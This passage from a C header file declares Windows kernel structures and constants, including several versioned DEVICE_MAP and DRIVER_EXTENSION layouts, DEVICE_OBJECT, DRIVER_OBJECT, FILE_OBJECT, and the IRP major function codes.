#define DOSDEVICE_DRIVE_CDROM       5
#define DOSDEVICE_DRIVE_RAMDISK     6

typedef struct _DEVICE_MAP_V1 {
    OBJECT_DIRECTORY* DosDevicesDirectory;
    OBJECT_DIRECTORY* GlobalDosDevicesDirectory;
    PVOID DosDevicesDirectoryHandle;
    ULONG ReferenceCount;
    ULONG DriveMap;
    UCHAR DriveType[32];
} DEVICE_MAP_V1, * PDEVICE_MAP_V1;

typedef struct _DEVICE_MAP_V1 DEVICE_MAP_COMPATIBLE;
typedef struct _DEVICE_MAP_V1* PDEVICE_MAP_COMPATIBLE;

//Since REDSTONE1 (14393)
typedef struct _DEVICE_MAP_V2 {
    OBJECT_DIRECTORY* DosDevicesDirectory;
    OBJECT_DIRECTORY* GlobalDosDevicesDirectory;
    PVOID DosDevicesDirectoryHandle;
    volatile LONG ReferenceCount;
    ULONG DriveMap;
    UCHAR DriveType[32];
    PEJOB ServerSilo;
} DEVICE_MAP_V2, * PDEVICE_MAP_V2;

//Since W11 (22000)
typedef struct _DEVICE_MAP_V3 {
    OBJECT_DIRECTORY* DosDevicesDirectory;
    OBJECT_DIRECTORY* GlobalDosDevicesDirectory;
    PEJOB ServerSilo;
    struct _DEVICE_MAP* GlobalDeviceMap;
    EX_FAST_REF DriveObject[26];
    LONGLONG ReferenceCount;
    PVOID DosDevicesDirectoryHandle;
    ULONG DriveMap;
    UCHAR DriveType[32];
} DEVICE_MAP_V3, PDEVICE_MAP_V3;

/*
** OBJECT MANAGER END
*/

/*
* WDM START
*/
#define TIMER_TOLERABLE_DELAY_BITS      6
#define TIMER_EXPIRED_INDEX_BITS        6
#define TIMER_PROCESSOR_INDEX_BITS      5

typedef struct _DISPATCHER_HEADER {
    union {
        union {
            volatile LONG Lock;
            LONG LockNV;
        } DUMMYUNIONNAME;

        struct {                            // Events, Semaphores, Gates, etc.
            UCHAR Type;                     // All (accessible via KOBJECT_TYPE)
            UCHAR Signalling;
            UCHAR Size;
            UCHAR Reserved1;
        } DUMMYSTRUCTNAME;

        struct {                            // Timer
            UCHAR TimerType;
            union {
                UCHAR TimerControlFlags;
                struct {
                    UCHAR Absolute : 1;
                    UCHAR Wake : 1;
                    UCHAR EncodedTolerableDelay : TIMER_TOLERABLE_DELAY_BITS;
                } DUMMYSTRUCTNAME;
            };

            UCHAR Hand;
            union {
                UCHAR TimerMiscFlags;
                struct {

#if !defined(KENCODED_TIMER_PROCESSOR)

                    UCHAR Index : TIMER_EXPIRED_INDEX_BITS;

#else

                    UCHAR Index : 1;
                    UCHAR Processor : TIMER_PROCESSOR_INDEX_BITS;

#endif

                    UCHAR Inserted : 1;
                    volatile UCHAR Expired : 1;
                } DUMMYSTRUCTNAME;
            } DUMMYUNIONNAME;
        } DUMMYSTRUCTNAME2;

        struct {                            // Timer2
            UCHAR Timer2Type;
            union {
                UCHAR Timer2Flags;
                struct {
                    UCHAR Timer2Inserted : 1;
                    UCHAR Timer2Expiring : 1;
                    UCHAR Timer2CancelPending : 1;
                    UCHAR Timer2SetPending : 1;
                    UCHAR Timer2Running : 1;
                    UCHAR Timer2Disabled : 1;
                    UCHAR Timer2ReservedFlags : 2;
                } DUMMYSTRUCTNAME;
            } DUMMYUNIONNAME;

            UCHAR Timer2Reserved1;
            UCHAR Timer2Reserved2;
        } DUMMYSTRUCTNAME3;

        struct {                            // Queue
            UCHAR QueueType;
            union {
                UCHAR QueueControlFlags;
                struct {
                    UCHAR Abandoned : 1;
                    UCHAR DisableIncrement : 1;
                    UCHAR QueueReservedControlFlags : 6;
                } DUMMYSTRUCTNAME;
            } DUMMYUNIONNAME;

            UCHAR QueueSize;
            UCHAR QueueReserved;
        } DUMMYSTRUCTNAME4;

        struct {                            // Thread
            UCHAR ThreadType;
            UCHAR ThreadReserved;
            union {
                UCHAR ThreadControlFlags;
                struct {
                    UCHAR CycleProfiling : 1;
                    UCHAR CounterProfiling : 1;
                    UCHAR GroupScheduling : 1;
                    UCHAR AffinitySet : 1;
                    UCHAR ThreadReservedControlFlags : 4;
                } DUMMYSTRUCTNAME;
            } DUMMYUNIONNAME;

            union {
                UCHAR DebugActive;

#if !defined(_X86_)

                struct {
                    BOOLEAN ActiveDR7 : 1;
                    BOOLEAN Instrumented : 1;
                    BOOLEAN Minimal : 1;
                    BOOLEAN Reserved4 : 3;
                    BOOLEAN UmsScheduled : 1;
                    BOOLEAN UmsPrimary : 1;
                } DUMMYSTRUCTNAME;

#endif

            } DUMMYUNIONNAME2;
        } DUMMYSTRUCTNAME5;

        struct {                         // Mutant
            UCHAR MutantType;
            UCHAR MutantSize;
            BOOLEAN DpcActive;
            UCHAR MutantReserved;
        } DUMMYSTRUCTNAME6;
    } DUMMYUNIONNAME;

    LONG SignalState;                   // Object lock
    LIST_ENTRY WaitListHead;            // Object lock
} DISPATCHER_HEADER, *PDISPATCHER_HEADER;

typedef struct _KEVENT {
    DISPATCHER_HEADER Header;
} KEVENT, *PKEVENT, *PRKEVENT;

typedef struct _FAST_MUTEX {
    LONG_PTR Count;
    void *Owner;
    ULONG Contention;
    struct _KEVENT Event;
    ULONG OldIrql;
    LONG __PADDING__[1];
} FAST_MUTEX, *PFAST_MUTEX;

typedef struct _KMUTANT {
    DISPATCHER_HEADER Header;
    LIST_ENTRY MutantListEntry;
    struct _KTHREAD *OwnerThread;
    BOOLEAN Abandoned;
    UCHAR ApcDisable;
} KMUTANT, *PKMUTANT, *PRKMUTANT, KMUTEX, *PKMUTEX, *PRKMUTEX;

typedef struct _KSEMAPHORE {
    DISPATCHER_HEADER Header;
    LONG Limit;
} KSEMAPHORE, *PKSEMAPHORE, *PRKSEMAPHORE;

typedef struct _KTIMER {
    DISPATCHER_HEADER Header;
    ULARGE_INTEGER DueTime;
    LIST_ENTRY TimerListEntry;
    struct _KDPC *Dpc;
    ULONG Processor;
    LONG Period;
} KTIMER, *PKTIMER, *PRKTIMER;

typedef struct _KDEVICE_QUEUE_ENTRY {
    LIST_ENTRY DeviceListEntry;
    ULONG SortKey;
    BOOLEAN Inserted;
} KDEVICE_QUEUE_ENTRY, *PKDEVICE_QUEUE_ENTRY, *PRKDEVICE_QUEUE_ENTRY;

typedef enum _KDPC_IMPORTANCE {
    LowImportance,
    MediumImportance,
    HighImportance
} KDPC_IMPORTANCE;

typedef struct _KDPC {
    union {
        ULONG TargetInfoAsUlong;
        struct {
            UCHAR Type;
            UCHAR Importance;
            volatile USHORT Number;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;

    SINGLE_LIST_ENTRY DpcListEntry;
    KAFFINITY ProcessorHistory;
    PVOID DeferredRoutine;
    PVOID DeferredContext;
    PVOID SystemArgument1;
    PVOID SystemArgument2;
    __volatile PVOID DpcData;
} KDPC, *PKDPC, *PRKDPC;

typedef struct _WAIT_CONTEXT_BLOCK {
    union {
        KDEVICE_QUEUE_ENTRY WaitQueueEntry;
        struct {
            LIST_ENTRY DmaWaitEntry;
            ULONG NumberOfChannels;
            ULONG SyncCallback : 1;
            ULONG DmaContext : 1;
            ULONG Reserved : 30;
        };
    };
    PVOID DeviceRoutine;
    PVOID DeviceContext;
    ULONG NumberOfMapRegisters;
    PVOID DeviceObject;
    PVOID CurrentIrp;
    PKDPC BufferChainingDpc;
} WAIT_CONTEXT_BLOCK, *PWAIT_CONTEXT_BLOCK;

#define MAXIMUM_VOLUME_LABEL_LENGTH  (32 * sizeof(WCHAR)) // 32 characters

typedef struct _VPB {
    CSHORT Type;
    CSHORT Size;
    USHORT Flags;
    USHORT VolumeLabelLength; // in bytes
    struct _DEVICE_OBJECT *DeviceObject;
    struct _DEVICE_OBJECT *RealDevice;
    ULONG SerialNumber;
    ULONG ReferenceCount;
    WCHAR VolumeLabel[MAXIMUM_VOLUME_LABEL_LENGTH / sizeof(WCHAR)];
} VPB, *PVPB;

typedef struct _KQUEUE {
    DISPATCHER_HEADER Header;
    LIST_ENTRY EntryListHead;
    ULONG CurrentCount;
    ULONG MaximumCount;
    LIST_ENTRY ThreadListHead;
} KQUEUE, *PKQUEUE;

typedef struct _KDEVICE_QUEUE {
    CSHORT Type;
    CSHORT Size;
    LIST_ENTRY DeviceListHead;
    KSPIN_LOCK Lock;

#if defined(_AMD64_)

    union {
        BOOLEAN Busy;
        struct {
            LONG64 Reserved : 8;
            LONG64 Hint : 56;
        };
    };

#else

    BOOLEAN Busy;

#endif

} KDEVICE_QUEUE, *PKDEVICE_QUEUE, *PRKDEVICE_QUEUE;

enum _KOBJECTS {
    EventNotificationObject = 0x0,
    EventSynchronizationObject = 0x1,
    MutantObject = 0x2,
    ProcessObject = 0x3,
    QueueObject = 0x4,
    SemaphoreObject = 0x5,
    ThreadObject = 0x6,
    GateObject = 0x7,
    TimerNotificationObject = 0x8,
    TimerSynchronizationObject = 0x9,
    Spare2Object = 0xa,
    Spare3Object = 0xb,
    Spare4Object = 0xc,
    Spare5Object = 0xd,
    Spare6Object = 0xe,
    Spare7Object = 0xf,
    Spare8Object = 0x10,
    Spare9Object = 0x11,
    ApcObject = 0x12,
    DpcObject = 0x13,
    DeviceQueueObject = 0x14,
    EventPairObject = 0x15,
    InterruptObject = 0x16,
    ProfileObject = 0x17,
    ThreadedDpcObject = 0x18,
    MaximumKernelObject = 0x19,
};

#define DO_VERIFY_VOLUME                0x00000002      // ntddk nthal ntifs wdm
#define DO_BUFFERED_IO                  0x00000004      // ntddk nthal ntifs wdm
#define DO_EXCLUSIVE                    0x00000008      // ntddk nthal ntifs wdm
#define DO_DIRECT_IO                    0x00000010      // ntddk nthal ntifs wdm
#define DO_MAP_IO_BUFFER                0x00000020      // ntddk nthal ntifs wdm
#define DO_DEVICE_HAS_NAME              0x00000040      // ntddk nthal ntifs
#define DO_DEVICE_INITIALIZING          0x00000080      // ntddk nthal ntifs wdm
#define DO_SYSTEM_BOOT_PARTITION        0x00000100      // ntddk nthal ntifs
#define DO_LONG_TERM_REQUESTS           0x00000200      // ntddk nthal ntifs
#define DO_NEVER_LAST_DEVICE            0x00000400      // ntddk nthal ntifs
#define DO_SHUTDOWN_REGISTERED          0x00000800      // ntddk nthal ntifs wdm
#define DO_BUS_ENUMERATED_DEVICE        0x00001000      // ntddk nthal ntifs wdm
#define DO_POWER_PAGABLE                0x00002000      // ntddk nthal ntifs wdm
#define DO_POWER_INRUSH                 0x00004000      // ntddk nthal ntifs wdm
#define DO_POWER_NOOP                   0x00008000
#define DO_LOW_PRIORITY_FILESYSTEM      0x00010000      // ntddk nthal ntifs
#define DO_XIP                          0x00020000
#define DO_DEVICE_TO_BE_RESET           0x04000000      
#define DO_DAX_VOLUME                   0x10000000    

#define FILE_REMOVABLE_MEDIA                        0x00000001
#define FILE_READ_ONLY_DEVICE                       0x00000002
#define FILE_FLOPPY_DISKETTE                        0x00000004
#define FILE_WRITE_ONCE_MEDIA                       0x00000008
#define FILE_REMOTE_DEVICE                          0x00000010
#define FILE_DEVICE_IS_MOUNTED                      0x00000020
#define FILE_VIRTUAL_VOLUME                         0x00000040
#define FILE_AUTOGENERATED_DEVICE_NAME              0x00000080
#define FILE_DEVICE_SECURE_OPEN                     0x00000100
#define FILE_CHARACTERISTIC_PNP_DEVICE              0x00000800
#define FILE_CHARACTERISTIC_TS_DEVICE               0x00001000
#define FILE_CHARACTERISTIC_WEBDAV_DEVICE           0x00002000
#define FILE_CHARACTERISTIC_CSV                     0x00010000
#define FILE_DEVICE_ALLOW_APPCONTAINER_TRAVERSAL    0x00020000
#define FILE_PORTABLE_DEVICE                        0x00040000

#define FILE_DEVICE_BEEP                0x00000001
#define FILE_DEVICE_CD_ROM              0x00000002
#define FILE_DEVICE_CD_ROM_FILE_SYSTEM  0x00000003
#define FILE_DEVICE_CONTROLLER          0x00000004
#define FILE_DEVICE_DATALINK            0x00000005
#define FILE_DEVICE_DFS                 0x00000006
#define FILE_DEVICE_DISK                0x00000007
#define FILE_DEVICE_DISK_FILE_SYSTEM    0x00000008
#define FILE_DEVICE_FILE_SYSTEM         0x00000009
#define FILE_DEVICE_INPORT_PORT         0x0000000a
#define FILE_DEVICE_KEYBOARD            0x0000000b
#define FILE_DEVICE_MAILSLOT            0x0000000c
#define FILE_DEVICE_MIDI_IN             0x0000000d
#define FILE_DEVICE_MIDI_OUT            0x0000000e
#define FILE_DEVICE_MOUSE               0x0000000f
#define FILE_DEVICE_MULTI_UNC_PROVIDER  0x00000010
#define FILE_DEVICE_NAMED_PIPE          0x00000011
#define FILE_DEVICE_NETWORK             0x00000012
#define FILE_DEVICE_NETWORK_BROWSER     0x00000013
#define FILE_DEVICE_NETWORK_FILE_SYSTEM 0x00000014
#define FILE_DEVICE_NULL                0x00000015
#define FILE_DEVICE_PARALLEL_PORT       0x00000016
#define FILE_DEVICE_PHYSICAL_NETCARD    0x00000017
#define FILE_DEVICE_PRINTER             0x00000018
#define FILE_DEVICE_SCANNER             0x00000019
#define FILE_DEVICE_SERIAL_MOUSE_PORT   0x0000001a
#define FILE_DEVICE_SERIAL_PORT         0x0000001b
#define FILE_DEVICE_SCREEN              0x0000001c
#define FILE_DEVICE_SOUND               0x0000001d
#define FILE_DEVICE_STREAMS             0x0000001e
#define FILE_DEVICE_TAPE                0x0000001f
#define FILE_DEVICE_TAPE_FILE_SYSTEM    0x00000020
#define FILE_DEVICE_TRANSPORT           0x00000021
#define FILE_DEVICE_UNKNOWN             0x00000022
#define FILE_DEVICE_VIDEO               0x00000023
#define FILE_DEVICE_VIRTUAL_DISK        0x00000024
#define FILE_DEVICE_WAVE_IN             0x00000025
#define FILE_DEVICE_WAVE_OUT            0x00000026
#define FILE_DEVICE_8042_PORT           0x00000027
#define FILE_DEVICE_NETWORK_REDIRECTOR  0x00000028
#define FILE_DEVICE_BATTERY             0x00000029
#define FILE_DEVICE_BUS_EXTENDER        0x0000002a
#define FILE_DEVICE_MODEM               0x0000002b
#define FILE_DEVICE_VDM                 0x0000002c
#define FILE_DEVICE_MASS_STORAGE        0x0000002d
#define FILE_DEVICE_SMB                 0x0000002e
#define FILE_DEVICE_KS                  0x0000002f
#define FILE_DEVICE_CHANGER             0x00000030
#define FILE_DEVICE_SMARTCARD           0x00000031
#define FILE_DEVICE_ACPI                0x00000032
#define FILE_DEVICE_DVD                 0x00000033
#define FILE_DEVICE_FULLSCREEN_VIDEO    0x00000034
#define FILE_DEVICE_DFS_FILE_SYSTEM     0x00000035
#define FILE_DEVICE_DFS_VOLUME          0x00000036
#define FILE_DEVICE_SERENUM             0x00000037
#define FILE_DEVICE_TERMSRV             0x00000038
#define FILE_DEVICE_KSEC                0x00000039
#define FILE_DEVICE_FIPS                0x0000003A
#define FILE_DEVICE_INFINIBAND          0x0000003B
#define FILE_DEVICE_VMBUS               0x0000003E
#define FILE_DEVICE_CRYPT_PROVIDER      0x0000003F
#define FILE_DEVICE_WPD                 0x00000040
#define FILE_DEVICE_BLUETOOTH           0x00000041
#define FILE_DEVICE_MT_COMPOSITE        0x00000042
#define FILE_DEVICE_MT_TRANSPORT        0x00000043
#define FILE_DEVICE_BIOMETRIC           0x00000044
#define FILE_DEVICE_PMI                 0x00000045
#define FILE_DEVICE_EHSTOR              0x00000046
#define FILE_DEVICE_DEVAPI              0x00000047
#define FILE_DEVICE_GPIO                0x00000048
#define FILE_DEVICE_USBEX               0x00000049
#define FILE_DEVICE_CONSOLE             0x00000050
#define FILE_DEVICE_NFP                 0x00000051
#define FILE_DEVICE_SYSENV              0x00000052
#define FILE_DEVICE_VIRTUAL_BLOCK       0x00000053
#define FILE_DEVICE_POINT_OF_SERVICE    0x00000054
#define FILE_DEVICE_STORAGE_REPLICATION 0x00000055
#define FILE_DEVICE_TRUST_ENV           0x00000056
#define FILE_DEVICE_UCM                 0x00000057
#define FILE_DEVICE_UCMTCPCI            0x00000058
#define FILE_DEVICE_PERSISTENT_MEMORY   0x00000059
#define FILE_DEVICE_NVDIMM              0x0000005a
#define FILE_DEVICE_HOLOGRAPHIC         0x0000005b
#define FILE_DEVICE_SDFXHCI             0x0000005c
#define FILE_DEVICE_UCMUCSI             0x0000005d

#define FILE_BYTE_ALIGNMENT             0x00000000
#define FILE_WORD_ALIGNMENT             0x00000001
#define FILE_LONG_ALIGNMENT             0x00000003
#define FILE_QUAD_ALIGNMENT             0x00000007
#define FILE_OCTA_ALIGNMENT             0x0000000f
#define FILE_32_BYTE_ALIGNMENT          0x0000001f
#define FILE_64_BYTE_ALIGNMENT          0x0000003f
#define FILE_128_BYTE_ALIGNMENT         0x0000007f
#define FILE_256_BYTE_ALIGNMENT         0x000000ff
#define FILE_512_BYTE_ALIGNMENT         0x000001ff

#define DPC_NORMAL 0
#define DPC_THREADED 1

#if _MSC_VER >= 1200
#pragma warning(push)
#pragma warning(disable:4324) // structure was padded due to __declspec(align())
#endif

typedef struct DECLSPEC_ALIGN(MEMORY_ALLOCATION_ALIGNMENT) _DEVICE_OBJECT {
    CSHORT Type;
    USHORT Size;
    LONG ReferenceCount;
    struct _DRIVER_OBJECT* DriverObject;
    struct _DEVICE_OBJECT* NextDevice;
    struct _DEVICE_OBJECT* AttachedDevice;
    struct _IRP* CurrentIrp;
    PIO_TIMER Timer;
    ULONG Flags;                                // See above:  DO_...
    ULONG Characteristics;                      // See ntioapi:  FILE_...
    __volatile PVPB Vpb;
    PVOID DeviceExtension;
    DEVICE_TYPE DeviceType;
    CCHAR StackSize;
    union {
        LIST_ENTRY ListEntry;
        WAIT_CONTEXT_BLOCK Wcb;
    } Queue;
    ULONG AlignmentRequirement;
    KDEVICE_QUEUE DeviceQueue;
    KDPC Dpc;

    //
    //  The following field is for exclusive use by the filesystem to keep
    //  track of the number of Fsp threads currently using the device
    //

    ULONG ActiveThreadCount;
    PSECURITY_DESCRIPTOR SecurityDescriptor;
    KEVENT DeviceLock;

    USHORT SectorSize;
    USHORT Spare1;

    struct _DEVOBJ_EXTENSION* DeviceObjectExtension;
    PVOID  Reserved;

} DEVICE_OBJECT;

typedef struct _DEVICE_OBJECT* PDEVICE_OBJECT;

#if _MSC_VER >= 1200
#pragma warning(pop)
#endif

typedef struct _DEVOBJ_EXTENSION {

    CSHORT          Type;
    USHORT          Size;

    //
    // Public part of the DeviceObjectExtension structure
    //

    PDEVICE_OBJECT  DeviceObject;               // owning device object

    // end_ntddk end_nthal end_ntifs end_wdm end_ntosp

    //
    // Universal Power Data - all device objects must have this
    //

    ULONG           PowerFlags;             // see ntos\po\pop.h
    // WARNING: Access via PO macros
    // and with PO locking rules ONLY.

    //
    // Pointer to the non-universal power data
    //  Power data that only some device objects need is stored in the
    //  device object power extension -> DOPE
    //  see po.h
    //

    struct          _DEVICE_OBJECT_POWER_EXTENSION  *Dope;

    //
    // power state information
    //

    //
    // Device object extension flags.  Protected by the IopDatabaseLock.
    //

    ULONG ExtensionFlags;

    //
    // PnP manager fields
    //

    PVOID           DeviceNode;

    //
    // AttachedTo is a pointer to the device object that this device
    // object is attached to.  The attachment chain is now doubly
    // linked: this pointer and DeviceObject->AttachedDevice provide the
    // linkage.
    //

    PDEVICE_OBJECT  AttachedTo;

    //
    // The next two fields are used to prevent recursion in IoStartNextPacket
    // interfaces.
    //

    LONG           StartIoCount;       // Used to keep track of number of pending start ios.
    LONG           StartIoKey;         // Next startio key
    ULONG          StartIoFlags;       // Start Io Flags. Need a separate flag so that it can be accessed without locks
    PVPB           Vpb;                // If not NULL contains the VPB of the mounted volume.
    // Set in the filesystem's volume device object.
    // This is a reverse VPB pointer.

    // begin_ntddk begin_wdm begin_nthal begin_ntifs begin_ntosp

} DEVOBJ_EXTENSION, *PDEVOBJ_EXTENSION;

typedef struct _FAST_IO_DISPATCH {
    ULONG SizeOfFastIoDispatch;
    PVOID FastIoCheckIfPossible;
    PVOID FastIoRead;
    PVOID FastIoWrite;
    PVOID FastIoQueryBasicInfo;
    PVOID FastIoQueryStandardInfo;
    PVOID FastIoLock;
    PVOID FastIoUnlockSingle;
    PVOID FastIoUnlockAll;
    PVOID FastIoUnlockAllByKey;
    PVOID FastIoDeviceControl;
    PVOID AcquireFileForNtCreateSection;
    PVOID ReleaseFileForNtCreateSection;
    PVOID FastIoDetachDevice;
    PVOID FastIoQueryNetworkOpenInfo;
    PVOID AcquireForModWrite;
    PVOID MdlRead;
    PVOID MdlReadComplete;
    PVOID PrepareMdlWrite;
    PVOID MdlWriteComplete;
    PVOID FastIoReadCompressed;
    PVOID FastIoWriteCompressed;
    PVOID MdlReadCompleteCompressed;
    PVOID MdlWriteCompleteCompressed;
    PVOID FastIoQueryOpen;
    PVOID ReleaseForModWrite;
    PVOID AcquireForCcFlush;
    PVOID ReleaseForCcFlush;
} FAST_IO_DISPATCH, *PFAST_IO_DISPATCH;

#define IO_TYPE_ADAPTER                 0x00000001
#define IO_TYPE_CONTROLLER              0x00000002
#define IO_TYPE_DEVICE                  0x00000003
#define IO_TYPE_DRIVER                  0x00000004
#define IO_TYPE_FILE                    0x00000005
#define IO_TYPE_IRP                     0x00000006
#define IO_TYPE_MASTER_ADAPTER          0x00000007
#define IO_TYPE_OPEN_PACKET             0x00000008
#define IO_TYPE_TIMER                   0x00000009
#define IO_TYPE_VPB                     0x0000000a
#define IO_TYPE_ERROR_LOG               0x0000000b
#define IO_TYPE_ERROR_MESSAGE           0x0000000c
#define IO_TYPE_DEVICE_OBJECT_EXTENSION 0x0000000d

#define IRP_MJ_CREATE                   0x00
#define IRP_MJ_CREATE_NAMED_PIPE        0x01
#define IRP_MJ_CLOSE                    0x02
#define IRP_MJ_READ                     0x03
#define IRP_MJ_WRITE                    0x04
#define IRP_MJ_QUERY_INFORMATION        0x05
#define IRP_MJ_SET_INFORMATION          0x06
#define IRP_MJ_QUERY_EA                 0x07
#define IRP_MJ_SET_EA                   0x08
#define IRP_MJ_FLUSH_BUFFERS            0x09
#define IRP_MJ_QUERY_VOLUME_INFORMATION 0x0a
#define IRP_MJ_SET_VOLUME_INFORMATION   0x0b
#define IRP_MJ_DIRECTORY_CONTROL        0x0c
#define IRP_MJ_FILE_SYSTEM_CONTROL      0x0d
#define IRP_MJ_DEVICE_CONTROL           0x0e
#define IRP_MJ_INTERNAL_DEVICE_CONTROL  0x0f
#define IRP_MJ_SHUTDOWN                 0x10
#define IRP_MJ_LOCK_CONTROL             0x11
#define IRP_MJ_CLEANUP                  0x12
#define IRP_MJ_CREATE_MAILSLOT          0x13
#define IRP_MJ_QUERY_SECURITY           0x14
#define IRP_MJ_SET_SECURITY             0x15
#define IRP_MJ_POWER                    0x16
#define IRP_MJ_SYSTEM_CONTROL           0x17
#define IRP_MJ_DEVICE_CHANGE            0x18
#define IRP_MJ_QUERY_QUOTA              0x19
#define IRP_MJ_SET_QUOTA                0x1a
#define IRP_MJ_PNP                      0x1b
#define IRP_MJ_PNP_POWER                IRP_MJ_PNP      
#define IRP_MJ_MAXIMUM_FUNCTION         0x1b

// Public structure
typedef struct _DRIVER_EXTENSION {

    //
    // Back pointer to Driver Object
    //

    struct _DRIVER_OBJECT *DriverObject;

    //
    // The AddDevice entry point is called by the Plug & Play manager
    // to inform the driver when a new device instance arrives that this
    // driver must control.
    //

    PVOID AddDevice;

    //
    // The count field is used to count the number of times the driver has
    // had its registered reinitialization routine invoked.
    //

    ULONG Count;

    //
    // The service name field is used by the pnp manager to determine
    // where the driver related info is stored in the registry.
    //

    UNICODE_STRING ServiceKeyName;

} DRIVER_EXTENSION, *PDRIVER_EXTENSION;

// Private, since 7.1
typedef struct _DRIVER_EXTENSION_V2 {
    struct _DRIVER_OBJECT* DriverObject;
    PVOID AddDevice;
    ULONG Count;
    UNICODE_STRING ServiceKeyName;
    struct _IO_CLIENT_EXTENSION* ClientDriverExtension;
    struct _FS_FILTER_CALLBACKS* FsFilterCallbacks;
} DRIVER_EXTENSION_V2, * PDRIVER_EXTENSION_V2;

// Private, since 8.0
typedef struct _DRIVER_EXTENSION_V3 {
    struct _DRIVER_OBJECT* DriverObject;
    PVOID AddDevice;
    ULONG Count;
    UNICODE_STRING ServiceKeyName;
    struct _IO_CLIENT_EXTENSION* ClientDriverExtension;
    struct _FS_FILTER_CALLBACKS* FsFilterCallbacks;
    PVOID KseCallbacks; //KernelShimEngine
    PVOID DvCallbacks; //DriverVerifier
} DRIVER_EXTENSION_V3, * PDRIVER_EXTENSION_V3;

// Private, since 8.1
typedef struct _DRIVER_EXTENSION_V4 {
    struct _DRIVER_OBJECT* DriverObject;
    PVOID AddDevice;
    ULONG Count;
    UNICODE_STRING ServiceKeyName;
    struct _IO_CLIENT_EXTENSION* ClientDriverExtension;
    struct _FS_FILTER_CALLBACKS* FsFilterCallbacks;
    PVOID KseCallbacks; //KernelShimEngine
    PVOID DvCallbacks; //DriverVerifier
    PVOID VerifierContext;
} DRIVER_EXTENSION_V4, * PDRIVER_EXTENSION_V4;

// Private, since 11 25XXX
typedef struct _DRIVER_EXTENSION_V5 {
    struct _DRIVER_OBJECT* DriverObject;
    PVOID AddDevice;
    ULONG Count;
    UNICODE_STRING ServiceKeyName;
    struct _IO_CLIENT_EXTENSION* ClientDriverExtension;
    struct _FS_FILTER_CALLBACKS* FsFilterCallbacks;
    PVOID KseCallbacks; //KernelShimEngine
    PVOID DvCallbacks; //DriverVerifier
    PVOID VerifierContext;
    struct _DRIVER_PROXY_EXTENSION* DriverProxyExtension;
} DRIVER_EXTENSION_V5, * PDRIVER_EXTENSION_V5; /* size: 0x0058 */

#define DRVO_UNLOAD_INVOKED             0x00000001
#define DRVO_LEGACY_DRIVER              0x00000002
#define DRVO_BUILTIN_DRIVER             0x00000004    // Driver objects for Hal, PnP Mgr
#define DRVO_REINIT_REGISTERED          0x00000008
#define DRVO_INITIALIZED                0x00000010
#define DRVO_BOOTREINIT_REGISTERED      0x00000020
#define DRVO_LEGACY_RESOURCES           0x00000040
// end_ntddk end_nthal end_ntifs end_ntosp
#define DRVO_BASE_FILESYSTEM_DRIVER     0x00000080   // A driver that is at the bottom of the filesystem stack.
// begin_ntddk begin_nthal begin_ntifs begin_ntosp

typedef struct _DRIVER_OBJECT {
    CSHORT Type;
    CSHORT Size;

    //
    // The following links all of the devices created by a single driver
    // together on a list, and the Flags word provides an extensible flag
    // location for driver objects.
    //

    PDEVICE_OBJECT DeviceObject;
    ULONG Flags;

    //
    // The following section describes where the driver is loaded.  The count
    // field is used to count the number of times the driver has had its
    // registered reinitialization routine invoked.
    //

    PVOID DriverStart;
    ULONG DriverSize;
    PVOID DriverSection; //PLDR_DATA_TABLE_ENTRY
    PDRIVER_EXTENSION DriverExtension;

    //
    // The driver name field is used by the error log thread
    // determine the name of the driver that an I/O request is/was bound.
    //

    UNICODE_STRING DriverName;

    //
    // The following section is for registry support.  Thise is a pointer
    // to the path to the hardware information in the registry
    //

    PUNICODE_STRING HardwareDatabase;

    //
    // The following section contains the optional pointer to an array of
    // alternate entry points to a driver for "fast I/O" support.  Fast I/O
    // is performed by invoking the driver routine directly with separate
    // parameters, rather than using the standard IRP call mechanism.  Note
    // that these functions may only be used for synchronous I/O, and when
    // the file is cached.
    //

    PFAST_IO_DISPATCH FastIoDispatch;

    //
    // The following section describes the entry points to this particular
    // driver.  Note that the major function dispatch table must be the last
    // field in the object so that it remains extensible.
    //

    PVOID DriverInit;
    PVOID DriverStartIo;
    PVOID DriverUnload;
    PVOID MajorFunction[IRP_MJ_MAXIMUM_FUNCTION + 1];

} DRIVER_OBJECT;
typedef struct _DRIVER_OBJECT *PDRIVER_OBJECT;

//
// The following structure is pointed to by the SectionObject pointer field
// of a file object, and is allocated by the various NT file systems.
//

typedef struct _SECTION_OBJECT_POINTERS {
    PVOID DataSectionObject;
    PVOID SharedCacheMap;
    PVOID ImageSectionObject;
} SECTION_OBJECT_POINTERS;
typedef SECTION_OBJECT_POINTERS* PSECTION_OBJECT_POINTERS;

//
// Define the format of a completion message.
//

typedef struct _IO_COMPLETION_CONTEXT {
    PVOID Port;
    PVOID Key;
} IO_COMPLETION_CONTEXT, * PIO_COMPLETION_CONTEXT;

typedef struct _FILE_OBJECT {
    CSHORT Type;
    CSHORT Size;
    PDEVICE_OBJECT DeviceObject;
    PVPB Vpb;
    PVOID FsContext;
    PVOID FsContext2;
    PSECTION_OBJECT_POINTERS SectionObjectPointer;
    PVOID PrivateCacheMap;
    NTSTATUS FinalStatus;
    struct _FILE_OBJECT* RelatedFileObject;
    BOOLEAN LockOperation;
    BOOLEAN DeletePending;
    BOOLEAN ReadAccess;
    BOOLEAN WriteAccess;
    BOOLEAN DeleteAccess;
    BOOLEAN SharedRead;
    BOOLEAN SharedWrite;
    BOOLEAN SharedDelete;
    ULONG Flags;
    UNICODE_STRING FileName;
    LARGE_INTEGER CurrentByteOffset;
    __volatile ULONG Waiters;
    __volatile ULONG Busy;
    PVOID LastLock;
    KEVENT Lock;
    KEVENT Event;
    __volatile PIO_COMPLETION_CONTEXT CompletionContext;
    KSPIN_LOCK IrpListLock;
    LIST_ENTRY IrpList;
    __volatile PVOID FileObjectExtension;
} FILE_OBJECT;
typedef struct _FILE_OBJECT* PFILE_OBJECT;

typedef ULONG_PTR ERESOURCE_THREAD;
typedef ERESOURCE_THREAD* PERESOURCE_THREAD;

typedef struct _OWNER_ENTRY {
    ERESOURCE_THREAD OwnerThread;
    union {
        LONG OwnerCount;
        ULONG TableSize;
    };

} OWNER_ENTRY, *POWNER_ENTRY;

typedef struct _ERESOURCE {
    LIST_ENTRY SystemResourcesList;
    POWNER_ENTRY OwnerTable;
    SHORT ActiveCount;
    USHORT Flag;
    PKSEMAPHORE SharedWaiters;
    PKEVENT ExclusiveWaiters;
    OWNER_ENTRY OwnerThreads[2];
    ULONG ContentionCount;
    USHORT NumberOfSharedWaiters;
    USHORT NumberOfExclusiveWaiters;
    union {
        PVOID Address;
        ULONG_PTR CreatorBackTraceIndex;
    };

